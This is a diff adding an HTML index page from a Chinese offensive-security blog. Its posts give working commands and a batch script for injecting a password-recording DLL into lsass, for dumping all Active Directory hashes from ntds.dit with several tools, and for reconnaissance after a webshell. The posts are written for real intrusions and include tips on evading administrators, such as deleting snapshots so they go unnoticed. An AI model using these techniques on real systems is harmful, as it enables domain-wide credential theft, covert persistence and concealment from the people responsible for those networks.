@@ -1,0 +1,1070 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="klion&#39;s blog"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="website" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>page - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+            <h1 id="main-title" class="title">klion's blog</h1>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/08/16/Hook-PasswordChangeNotify/">
+                维持域管权限的一些简单办法[ Hook PasswordChangeNotify ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-08-16</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/getdomain/">getdomain</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>可利用 <code>Hook PasswordChangeNotify</code> 的方式,无需重启系统,且能实时记录修改的密码,只要目标机器不重启一般都不会失效,具体方法很简单,首先,准备好 <code>HookPasswordChange.dll</code> 和 <code>Invoke-ReflectivePEInjection.ps1</code> [主要是用它来把我们事先准备好的 HookPasswordChange.dll 注入到 <code>lsass</code> 进程中,这里有点类似劫持的意思],实际渗透中,并不一定非要把它记录在目标系统的本地文件中[记录到的密码默认放在c:\windows\temp\passwords.txt文件中],你也可以尝试直接把记录到的账号发送到远程指定的邮箱中[有人已提供改进过的dll],自己去谷歌找找,应该可以找到,下面是在本地测试的实际效果:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> powershell –<span class="built_in">exec</span> bypass –Command <span class="string">"&amp; &#123;Import-Module 'C:\Invoke-ReflectivePEInjection.ps1';Invoke-ReflectivePEInjection -PEPath C:\HookPasswordChange.dll –procname lsass&#125;"</span></span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hook dll injection.png" alt=""></p>
+<p>实际的效果如下<br><img src="/img/hook dll injection record pass.png" alt=""><br><img src="/img/hook dll injection record pass fish.png" alt=""><br><img src="/img/hook dll injection record pass res.png" alt=""></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/08/15/powershell-domainhash/">
+                完整导出域内用户hash小记 [powershell离线提取域内所有账户hash]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-08-15</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/domainhash/">domainhash</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">利用 DSInternals PowerShell</div></pre></td></tr></table></figure></p>
+<p>本地测试环境:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">win <span class="number">2012</span>r2</div></pre></td></tr></table></figure></p>
+<p>离线导出环境要求:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Windows PowerShell <span class="number">3</span>+</div><div class="line">.NET Framework <span class="number">4.5</span>+</div></pre></td></tr></table></figure></p>
+<p>支持的系统:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Windows Server <span class="number">2012</span> R2</div><div class="line">Windows Server <span class="number">2008</span> R2</div><div class="line">Windows <span class="number">10</span> <span class="number">64</span>-bit</div><div class="line">Windows <span class="number">8.1</span> <span class="number">64</span>-bit</div><div class="line">Windows <span class="number">7</span> <span class="number">64</span>-bit</div></pre></td></tr></table></figure></p>
+<p>先看下当前系统的powershell版本:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ps &gt; Get-Host <span class="params">| Select-Object Version</span></div></pre></td></tr></table></figure></p>
+<p>放开pwoershell脚本执行限制:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Set-ExecutionPolicy Unrestricted</div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell domainhash version.png" alt=""><br></p>
+<p>准备好ntds.dit和SYSTEM.hiv文件:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ntds.dit [可以利用shadowcopy.bat快速获取]</div><div class="line">system.hiv [reg即可获取]</div><div class="line">reg save hklm\system system.hive</div></pre></td></tr></table></figure></p>
+<p>安装,导入DSInternals模块:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cd DSInternals</div><div class="line">powershell</div><div class="line">Import-Module .\DSInternals</div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell domainhash ntds system.png" alt=""></p>
+<p>直接导出域内所有用户hash<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$key = Get-BootKey -SystemHivePath <span class="string">"C:\system.hive"</span></div><div class="line">Get-ADDBAccount -All -DBPath <span class="string">"C:\ntds.dit"</span> -BootKey $key <span class="params">| Out-File hash.txt</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell domainhash hashres.png" alt=""></p>
+<p>也可只获取指定账户的详细信息<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$key = Get-BootKey -SystemHivePath <span class="string">"C:\system.hive"</span></div><div class="line">Get-ADDBAccount -DistinguishedName <span class="string">'CN=krbtgt,CN=Users,DC=klionsec,DC=org'</span>  -DBPath <span class="string">'C:\ntds.dit'</span> -BootKey $key</div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell domainhash krbrgethash.png" alt=""><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/08/14/shadow-copy-hash/">
+                完整导出域内用户hash小记 [vshadow + ShadowCopy + QuarksPwDump]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-08-14</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/domainhash/">domainhash</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>利用vsshadow <code>[ 微软的卷影拷贝工具 ]</code>,来复制出ntds.dit,从而导出域内所有用户hash,本地虽然没问题,但实际测试中有时候会不好使</p>
+<p>第一步:将三个工具都传到目标机器的同一目录下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vshadow.exe + ShadowCopy.bat + QuarksPwDump.exe</div></pre></td></tr></table></figure></p>
+<p>shadowcopy.cat:<br><figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">setlocal</span></div><div class="line"><span class="keyword">if</span> <span class="keyword">NOT</span> "<span class="variable">%CALLBACK_SCRIPT%</span>"=="" <span class="keyword">goto</span> :IS_CALLBACK</div><div class="line"><span class="built_in">set</span> SOURCE_DRIVE_LETTER=<span class="variable">%SystemDrive%</span></div><div class="line"><span class="built_in">set</span> SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit</div><div class="line"><span class="built_in">set</span> DESTINATION_PATH=%~dp0</div><div class="line">@<span class="built_in">echo</span> ...Determine the scripts to be executed/generated...</div><div class="line"><span class="built_in">set</span> CALLBACK_SCRIPT=%~dpnx0</div><div class="line"><span class="built_in">set</span> TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.<span class="built_in">cmd</span></div><div class="line">@<span class="built_in">echo</span> ...Creating the shadow <span class="built_in">copy</span>...</div><div class="line">"%~dp0vshadow.exe" -script=<span class="variable">%TEMP_GENERATED_SCRIPT%</span> -exec="<span class="variable">%CALLBACK_SCRIPT%</span>" <span class="variable">%SOURCE_DRIVE_LETTER%</span></div><div class="line"><span class="built_in">del</span> /f <span class="variable">%TEMP_GENERATED_SCRIPT%</span></div><div class="line">@<span class="keyword">goto</span> :EOF</div><div class="line">:IS_CALLBACK</div><div class="line"><span class="built_in">setlocal</span></div><div class="line">@<span class="built_in">echo</span> ...Obtaining the shadow <span class="built_in">copy</span> device name...</div><div class="line"><span class="keyword">call</span> <span class="variable">%TEMP_GENERATED_SCRIPT%</span></div><div class="line">@<span class="built_in">echo</span> ...Copying from the shadow <span class="built_in">copy</span> to the destination <span class="built_in">path</span>...</div><div class="line"><span class="built_in">copy</span> "<span class="variable">%SHADOW_DEVICE_1%</span>\<span class="variable">%SOURCE_RELATIVE_PATH%</span>" <span class="variable">%DESTINATION_PATH%</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/shadowcopy exec.png" alt=""><br><br><img src="/img/shadowcopy exec res.png" alt=""><br></p>
+<p>第二步:然后以管理员权限运行ShadowCopy.bat脚本,之后提取的ntds.dit会被复制到当前目录,利用esentutl工具修复ntds.dit文件<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">esentutl /p /o ntds.dit</div></pre></td></tr></table></figure></p>
+<p><img src="/img/shadowcopy esentutl.png" alt=""><br></p>
+<p>第三步:利用QuarksPwDump 读取修复后的ntds.dit文件,导出域内所有账户hash<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">reg save hklm\system system.hive 同样还是先导出syskey</div><div class="line">QuarksPwDump.exe --dump-hash-domain --with-history --ntds-file <span class="symbol">c:</span>\ntds.dit --system-file <span class="symbol">c:</span>\system.hive -o <span class="symbol">c:</span>\res.txt 一定要注意这里要给绝对路径,选项参数之间只能有一个空格</div></pre></td></tr></table></figure></p>
+<p><img src="/img/shadowcopy hash.png" alt=""><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/08/14/ntdsutil-quarkspwdump/">
+                完整导出域内用户hash小记 [ ntdsutil + QuarksPwDump ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-08-14</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/domainhash/">domainhash</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>自己在实际渗透中这种方法用的相对比较多[方便快捷],ntdsutil[ad数据库的命令行管理工具],利用它我们可以快速手工创建快照导出域内用户数据库),像这样的操作,实际渗透中还是不要交互的好,所以下面会全部都以非交互的方式来进行:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntdsutil + QuarksPwDump</div></pre></td></tr></table></figure></p>
+<p>第一步:创建快照<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntdsutil snapshot <span class="string">"activate instance ntds"</span> create quit quit</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ntdsutil snapshot.png" alt=""></p>
+<p>第二步:挂载刚才生成好的快照:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntdsutil snapshot <span class="string">"mount &#123;793a0923-1a83-428b-8860-535fb2b2866a&#125;"</span> quit quit</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ntdsutil mount.png" alt=""><br><img src="/img/ntdsutil mount res.png" alt=""></p>
+<p>第三步:把导出的ntds数据库复制到指定位置<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">copy <span class="symbol">C:</span>\$SNAP_201705211114_VOLUMEC$\windows\ntds\ntds.dit <span class="symbol">c:</span>\ntds.dit</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ntdsutil copy.png" alt=""></p>
+<p>第四步:删除快照,还是要注意千万别忘了,被管理发现始终不太好<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntdsutil snapshot <span class="string">"unmount &#123;793a0923-1a83-428b-8860-535fb2b2866a&#125;"</span> <span class="string">"delete &#123;793a0923-1a83-428b-8860-535fb2b2866a&#125;"</span> quit quit</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ntdsutil unmount.png" alt=""></p>
+<p>第五步:开始利用QuarksPwDump提取账户hash<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">reg save hklm\system system.hiv  提取syskey,这里就直接放到当前目录下了,等会儿提取hash要用</div><div class="line">QuarksPwDump.exe --dump-hash-domain --with-history --ntds-file <span class="symbol">c:</span>\ntds.dit --system-file <span class="symbol">c:</span>\system.hiv -o <span class="symbol">c:</span>\pass.txt</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ntdsutil hash.png" alt=""></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/08/13/vssown-vbs-libesedb-NtdsXtract/">
+                完整导出域内用户hash小记 [vssown.vbs + libesedb + NtdsXtract]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-08-13</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/domainhash/">domainhash</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>本地测试环境:<br>&nbsp;&nbsp;&nbsp;&nbsp;域控 2008 r2 64bit</p>
+<p>离线利用linux提取域内所有用户hash,实际测试可行,不过文件确实有点儿大,用于测试的系统域内用户只有十个左右,却已经打了12M[按这样算的话,一千个用户也就将近1G],如果用户量特别大的话,可想而知,不过好在信息非常全:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vssown.vbs + libesedb + NtdsXtract</div></pre></td></tr></table></figure></p>
+<p>查看vssown.vbs帮助:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cscript vssown.vbs</div></pre></td></tr></table></figure></p>
+<p><img src="/img/vssown help.png" alt=""><br></p>
+<p>第一步,启动服务:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cscript vssown.vbs /start</div><div class="line">cscript vssown.vbs /status</div></pre></td></tr></table></figure></p>
+<p><img src="/img/vssown start stutas.png" alt=""><br></p>
+<p>第二步,创建快照:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cscript vssown.vbs /create C</div><div class="line">cscript vssown.vbs /list</div></pre></td></tr></table></figure></p>
+<p><img src="/img/vssown create list.png" alt=""><br></p>
+<p>第三步,把SYSTEM和ntds.dit文件都复制回本地,如果比较多,下回本地确实有点儿麻烦:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system .</div><div class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit .</div></pre></td></tr></table></figure></p>
+<p><img src="/img/vssown copy.png" alt=""><br></p>
+<p>第四步,删除快照,这非常重要,千万不要忘了,不然被管理员看到就不太好了:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cscript vssown.vbs /delete *</div></pre></td></tr></table></figure></p>
+<p><img src="/img/vssown delete.png" alt=""><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cscript vssown.vbs /stop</div></pre></td></tr></table></figure>
+<p><img src="/img/vssown stop.png" alt=""><br></p>
+<p>第五步,在本地编译安装好libesedb 和 NTDSXtract,这里我把它俩都放到同级目录中了:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ./configure</span></div><div class="line"><span class="comment"># make</span></div><div class="line"><span class="comment"># cd esedbtools/</span></div><div class="line"><span class="comment"># ./esedbexport ./ntds.dit   这里我已经把ntds.dit复制到当前目录下了</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/esedbexport.png" alt=""><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># mv ntds.dit.export/ ../../</span></div><div class="line"><span class="comment"># cd ../../</span></div><div class="line"><span class="comment"># cd NTDSXtract\ 1.0/</span></div><div class="line"><span class="comment"># python dsusers.py  ../ntds.dit.export/datatable.3  ../ntds.dit.export/link_table.5 --passwordhashes '/root/SYSTEM' 这里的SYSTEM文件最好给绝对路径</span></div></pre></td></tr></table></figure>
+<p><img src="/img/vssown hash.png" alt=""><br><br><img src="/img/vssown krbtgt.png" alt=""><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/08/11/domain-info-search/">
+                域内信息搜集实战
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-08-11</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/active-pentest/">active pentest</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 搜集本机信息:</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;这里就以拥有一个域内网中的普通用户[注意,这里并不是域用户哦]权限的机器的webshell作为我们整个域内渗透的开始,首先,没别的,先搜集下各种信息,主要是搜集各类账号密码,自然是翻到的越多越好(多一个有用的密码或hash就多一条生路),废话不多说,我们开始正题,从搜集本机信息开始,理论上来讲,拿到webshell的第一反应,没别的,先看下当前用户的系统权限再说,直接是system权限的这种情况咱们找时间另说,就先以一个很普通的网站用户权限,来继续我们下面的内容,whoami加上all参数可以把当前用户的sid也顺带查出来,只是告诉大家可以用这种方式查用户sid,虽然这个用户的sid没什么卵用,但如果是域管的就不一样了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># whoami  /all</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/whoami all.jpg" alt="&#39;&#39;"></p>
+<p>接着再来看看本机的网络配置,主要是想看看当前机器是否处在内网,有几个内网,内网段分别是多少,是否是在域内网,网关是多少,dns指向的ip是哪里,当然,你也可以用wmic来查,但那个显示的并不是很完整,个人早已习惯了ipconfig /all,所以就用这个了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ipconfig /all</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ipconfig all.jpg" alt="&#39;&#39;"></p>
+<p>查看所有登录到当前系统中的用户状态,主要还是想看看管理员在不在(哪怕不在,最近登录过也好,加入提成了,还能抓下历史明文),当然,query的用法并非仅限于此,关于query 的更多用法,请自行查看该命令帮助<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># query user</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/query ueser.jpg" alt="&#39;&#39;"></p>
+<p>看下当前系统中的所有网络连接(包括tcp和udp的),以及每个连接所对应的发起程序,主要是想看看有没有我们可以快速利用到的一些服务,运气好的情况下,你甚至可以看到同行的tcp马还在上面,如果是域控机器,这个连接[udp]可能会有非常多,你可以选择先把它重定向到文件然后下下来看<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># netstat -ano | more</span></div><div class="line"><span class="comment"># netstat -anob &gt;&gt; portres.txt</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/netstat ano.jpg" alt="&#39;&#39;"></p>
+<p>查下本机的arp记录,看看最近和本机通信过的其它内网机器,在这里也许你会发现其它工具扫不到的机器和网段<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># arp -a</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/arpa.jpg" alt="&#39;&#39;"></p>
+<p>看看本机的防火墙配置及状态,win建议用’netsh advfirewall firewall’,看你心情,随便用哪个,反正只是用个工具而已,能出正确的结果即可,不纠结<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># netsh firewall show config</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/netsh firesall.jpg" alt="&#39;&#39;"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># netsh advfirewall firewall show rule name=all | more  </span></div><div class="line"><span class="comment"># netsh firewall show state</span></div></pre></td></tr></table></figure>
+<p><img src="/img/netsh statues.jpg" alt="&#39;&#39;"> </p>
+<p>查看当前机器本地系统中的环境变量,主要是想瞅瞅path里面有没有我们可以利用到的一些运行环境,比如py,java(免杀效果好,不过这个,一般权限也比较高),ps(免杀效果好),ruby,perl等等……这样一来会方便我们后续用一些外部工具<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># set</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/set.jpg" alt="&#39;&#39;"></p>
+<p>获取本机的mac,伪造mac可能会用得上<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># getmac</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/getmac.jpg" alt="&#39;&#39;"></p>
+<p>查看当前windows的内核版本,其实可以忽略,systeminfo一下就搞定了,如果你只是想快速的看下当前系统的内核版本,不妨用用<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ver</span></div></pre></td></tr></table></figure></p>
+<p>查看当前系统中安装的所有软件及软件所对应的具体版本,看看有没有我们提权能用到的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># wmic product get name,version</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/wmic programcs.jpg" alt="&#39;&#39;"></p>
+<p>查看当前系统中各个分区的大概使用情况,拷文件的时候心里有个谱<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># wmic logicaldisk where drivetype=3 get name,freespace,systemname,filesystem,volumeserialnumber</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/wmic diskcs.jpg" alt="&#39;&#39;"></p>
+<p>看下当前系统的补丁打的如何,因为数据比较多时间较长,菜刀里面很容易超时,不过,多试几次就好了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># wmic qfe get CSName,Description,hotfixid</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/wmic kb.jpg" alt="&#39;&#39;"></p>
+<p>当然,你还有更简单直观的命令可以选择,查看当前系统的详细配置,不过回显的内容比较多,可能也会出现超时的情况<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># systeminfo</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/systeminfos.jpg" alt="&#39;&#39;"></p>
+<p>快速定位一些能提权的补丁编号,当然,你要自己针对目标的系统(03和08以上最好分开单独准备)事先准备好一些补丁号,记得务必要在可读写目录中执行该语句,因为它要创创建临时文件<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># systeminfo&gt;temp.txt&amp;(for %i in (KB2271195 KB2124261 KB2160329 KB2621440  KB2707511 KB2829361 KB2864063 KB3000061 KB3045171 KB3036220 KB3077657 KB3079904 KB3134228 KB3124280 KB3199135) do <span class="doctag">@type</span> temp.txt|<span class="doctag">@find</span> /i  "%i"|| <span class="doctag">@echo</span> %i Not Installed!)&amp;del /f /q /a temp.txt</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/kbfinds.jpg" alt="&#39;&#39;"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB3079904" 这是补丁安装后的状态</span></div></pre></td></tr></table></figure>
+<p><img src="/img/wmicfindkb.jpg" alt="&#39;&#39;"></p>
+<p>查看当前机器所安装的驱动,必要的时候,兴许对提权有些帮助,不过对虚拟机可能并没什么卵用,如果是实体物理机兴许还能利用上<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># driverquery</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/driveers.jpg" alt="&#39;&#39;"></p>
+<p>查看当前机器的开启了哪些共享<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># net share </span></div><div class="line"><span class="comment"># net share \\hostname 	查看指定的远程机器所开放的共享</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/net share.jpg" alt="&#39;&#39;"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># wmic share  get name,path,status  利用wmic查找共享</span></div></pre></td></tr></table></figure>
